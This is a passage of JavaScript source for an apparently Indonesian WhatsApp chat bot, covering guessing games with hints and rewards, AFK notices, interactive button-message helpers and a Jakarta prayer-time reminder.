await send1ButReply(m.chat,JwbTrue("Tebak Game", tebakgame[m.chat][2]) + `\n\nKirim perintah .tebakgame untuk bermain lagi 🎮`,'Main Lagi','Main Lagi','.tebakgame','gaada')
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tegem untuk bantuan dan .ytegem untuk menyerah 🎮`, footxt, '.tegem', 'Hint', '.ytegem', 'Nyerah', m)
 }
}
if (tebakgambar[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgambar[m.chat][2], balance)
await send1ButReply(m.chat,JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah .tebakgambar untuk bermain lagi 🎮`,'Main Lagi','Main Lagi','.tebakgambar','gaada')
/*newReply(JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah .tebakgambar untuk bermain lagi 🎮`, footxt, m)*/
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else send2ButReply(m.chat,"❌ Jawaban salah" + `\n\nKirim perintah .tega untuk bantuan dan .ytega untuk menyerah 🎮`,'Bantuan','Bantuan','.tega','Nyerah','Nyerah','.ytega','gaada')

/*Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tega untuk bantuan dan .ytega untuk menyerah 🎮`, footxt, '.tega', 'Hint', '.ytega', 'Nyerah', m)*/
 }
}
if (tebakkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkata[m.chat][2], balance)
await send1ButReply(m.chat,JwbTrue("Tebak Kata", tebakkata[m.chat][2]) + `\n\nKirim perintah .tebakkata untuk bermain lagi 🎮`,'Main Lagi','Main Lagi','.tebakkata','gaada')
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teka untuk bantuan dan .yteka untuk menyerah 🎮`, footxt, '.teka', 'Hint', '.yteka', 'Nyerah', m)
 }
}
if (tebakbendera[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
jawaban = json.name.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakbendera[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Tebak Bendera", tebakbendera[m.chat][2]) + `\n\nKirim perintah .tebakbendera untuk bermain lagi 🎮`,'Main Lagi','Main Lagi','.tebakbendera','gaada')
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tebe untuk bantuan dan .ytebe untuk menyerah 🎮`, footxt, '.tebe', 'Hint', '.ytebe', 'Nyerah', m)
 }
}
if (caklontong[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == caklontong[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, caklontong[m.chat][2], balance)
await send1ButReply(m.chat,JwbTrue("Cak Lontong", caklontong[m.chat][2]) + `\n\nKirim perintah .caklontong untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.caklontong','gaada')
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .telo untuk bantuan dan .ytelo untuk menyerah 🎮`, footxt, '.telo', 'Hint', '.ytelo', 'Nyerah', m)
 }
}
if (susunkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == susunkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, susunkata[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Susun Kata", susunkata[m.chat][2]) + `\n\nKirim perintah .susunkata untuk bermain lagi 🎮`,'Main Lagi','Main Lagi','.susunkata','gaada')
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else newReply("❌ Jawaban salah" + `\n\nKirim perintah .tesuka untuk bantuan dan .ytesuka untuk menyerah 🎮`)
 }
}
if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkalimat[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2]) + `\n\nKirim perintah .tebakkalimat untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tebakkalimat','gaada')
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tekatu untuk bantuan dan .ytekatu untuk menyerah 🎮`, footxt, '.tekatu', 'Hint', '.ytekatu', 'Nyerah', m)
 }
}
if (siapaaku[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == siapaaku[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, siapaaku[m.chat][2], balance)
await send1ButReply(m.chat,JwbTrue("Tebak Siapa", siapaaku[m.chat][2]) + `\n\nKirim perintah .tebaksiapa untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tebaksiapa','gaada')
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tesi untuk bantuan dan .ytesi untuk menyerah 🎮`, footxt, '.tesi', 'Hint', '.ytesi', 'Nyerah', m)
 }
}
if (tekateki[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tekateki[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tekateki[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Teka Teki", tekateki[m.chat][2]) + `\n\nKirim perintah .tekateki untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tekateki','gaada')
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tete untuk bantuan dan .ytete untuk menyerah 🎮`, footxt, '.tete', 'Hint', '.ytete', 'Nyerah', m)
 }
}
if (tebakkimia[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
jawaban = json.unsur.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkimia[m.chat][2], balance)
await send1ButReply(m.chat,JwbTrue("Teka Kimia", tebakkimia[m.chat][2]) + `\n\nKirim perintah .tebakkimia untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tebakkimia','gaada')
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teki untuk bantuan dan .yteki untuk menyerah 🎮`, footxt, '.teki', 'Hint', '.yteki', 'Nyerah', m)
 }
}
if (tebaklirik[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaklirik[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Teka Lirik", tebaklirik[m.chat][2]) + `\n\nKirim perintah .tebaklirik untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tebaklirik','gaada')
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teli untuk bantuan dan .yteli untuk menyerah 🎮`, footxt, '.teli', 'Hint', '.yteli', 'Nyerah', m)
 }
}
if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaktebakan[m.chat][2], balance) 
await send1ButReply(m.chat,JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2]) + `\n\nKirim perintah .tebaktebakan untuk bermain lagi 🎮` ,'Main Lagi','Main Lagi','.tebaktebakan','gaada')
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else Aira.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teteb untuk bantuan dan .yteteb untuk menyerah 🎮`, footxt, '.teteb', 'Hint', '.yteteb', 'Nyerah', m)
 }
}


 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
newReply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
Aira.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
}
}


//button new

async function send1ButReply(kirimke,isipesan,text1,title1,id1,fotonya){
let gambarrr = fotonya?fotonya:setting.pathimg;
console.log("but1fotonya"+fotonya)
if (gambarrr=='gaada'){
let msgii = generateWAMessageFromContent(kirimke, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: isipesan
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 

header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: false
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text1}",
"title":"${title1}",
"id":"${id1}"

}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}else{
let msgii = generateWAMessageFromContent(kirimke, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: isipesan
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 

header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: gambarrr } }, { upload: Aira.waUploadToServer }))
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text1}",
"title":"${title1}",
"id":"${id1}"

}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}

}
async function send2ButReply(kirimke,isipesan,text1,title1,id1,text2,title2,id2,fotonya){
let gambarrr = fotonya?fotonya:setting.pathimg;
console.log("but2fotonya"+fotonya)
if (gambarrr=='gaada'){
console.log("jika gaada")
let msgii = generateWAMessageFromContent(kirimke, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: isipesan
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text1}",
"title":"${title1}",
"id":"${id1}"

}`
},{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text2}",
"title":"${title2}",
"id":"${id2}"
}`

}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}else{
    console.log("jika ada")
let msgii = generateWAMessageFromContent(kirimke, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: isipesan
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: gambarrr } }, { upload: Aira.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text1}",
"title":"${title1}",
"id":"${id1}"

}`
},{
"name": "quick_reply", 
"buttonParamsJson": `{ 
"display_text":"${text2}",
"title":"${title2}",
"id":"${id2}"
}`

}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}

}
async function sendButMenu(teksnya,jsonn,namaMenu) {
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./aira.jpg")}, { upload: Aira.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [
{
"title": "Navigasi ✈️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": [
  { "header": "Simplemenu", "title": "Return To Menu", "id": ".simplemenu" },
  { "header": "Allmenu", "title": "Display Allmenu", "id": ".Allmenu" }
]

},
{
"title": "${namaMenu}",
"highlight_label": \"Powered By ${setting.ownerName}\",
"rows": ${jsonn}
}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Instagram Owner\",\"url\":\"${setting.instagram}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Tiktok Owner\",\"url\":\"${setting.tiktok}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Grub Bot Wa\",\"url\":\"${setting.gcwa}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Donasi\",\"title\":\"Donasi\",\"id\":\".donasi\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})


}
let autoshalat;
autoshalat = autoshalat ? autoshalat : {}
//	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? user.id : m.sender
	let id = m.chat 
	let isActive = Object.values(autoshalat).includes(true);
    if(id in autoshalat && isActive) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '11:39',
    ashar: '15:43',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak *${pushname}*,\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat😁.\n\n*${waktu}*\n_untuk wilayah Jakarta dan sekitarnya._`
    autoshalat[id] = [
    newReply(caption),
    setTimeout(async () => {
    delete autoshalat[m.chat]
    }, 57000)
    ]
    console.log(autoshalat)}
    }

switch(command) {
case "tebakgambar": {
if (tebakgambar[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.chat] = [
await Aira.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}), result, 250,
setTimeout(() => {
if (tebakgambar[m.chat]) {
delete tebakgambar[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tega': {
if (!(m.chat in tebakgambar)) return
let json = tebakgambar[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytega','gaada')
}
break
case 'ytega': {
if (!(m.chat in tebakgambar)) return
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakgame": {
if (tebakgame[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgame[m.chat] = [
await Aira.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
delete tebakgame[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tegem': {
if (!(m.chat in tebakgame)) return
let json = tebakgame[m.chat][1]
send1ButReply(m.chat,'```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytegem','gaada')
}
break
case 'ytegem': {
if (!(m.chat in tebakgame)) return
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakkata": {
if (tebakkata[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkata[m.chat] = [
await Aira.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkata[m.chat]) {
delete tebakkata[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'family100': {
if (!m.isGroup) return newReply(mess.OnlyGrup)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await Aira.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'teka': {
if (!(m.chat in tebakkata)) return
let json = tebakkata[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.yteka','gaada')
}
break
case 'yteka': {
if (!(m.chat in tebakkata)) return
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakbendera": {
if (tebakbendera[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.name)
tebakbendera[m.chat] = [
await Aira.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakbendera[m.chat]) {
delete tebakbendera[m.chat]
return newReply (waktuHabis(result.name), footxt, m)
}
}, 120000)
]
}
break
case 'tebe': {
if (!(m.chat in tebakbendera)) return
let json = tebakbendera[m.chat][1]
send1ButReply(m.chat,'```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytebe','gaada')
}
break
case 'ytebe': {
if (!(m.chat in tebakbendera)) return
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebakkalimat': {
if (tebakkalimat[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.chat] = [
await Aira.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkalimat[m.chat]) {
delete tebakkalimat[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tekatu': {
if (!(m.chat in tebakkalimat)) return
let json = tebakkalimat[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytekatu','gaada')
}
break
case 'ytekatu': {
if (!(m.chat in tebakkalimat)) return
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaksiapa': {
if (siapaaku[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
siapaaku[m.chat] = [
await Aira.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (siapaaku[m.chat]) {
delete siapaaku[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tesi': {
if (!(m.chat in siapaaku)) return
let json = siapaaku[m.chat][1]

}
break
case 'ytesi': {
if (!(m.chat in siapaaku)) return
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebakkimia': {
if (tebakkimia[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.unsur)
tebakkimia[m.chat] = [
await Aira.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkimia[m.chat]) {
delete tebakkimia[m.chat]
return newReply (waktuHabis(result.unsur), footxt, m)
}
}, 120000)
]
}
break
case 'teki': {
if (!(m.chat in tebakkimia)) return
let json = tebakkimia[m.chat][1]
send1ButReply(m.chat,'```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.yteki','gaada')
}
break
case 'yteki': {
if (!(m.chat in tebakkimia)) return
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaklirik': {
if (tebaklirik[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
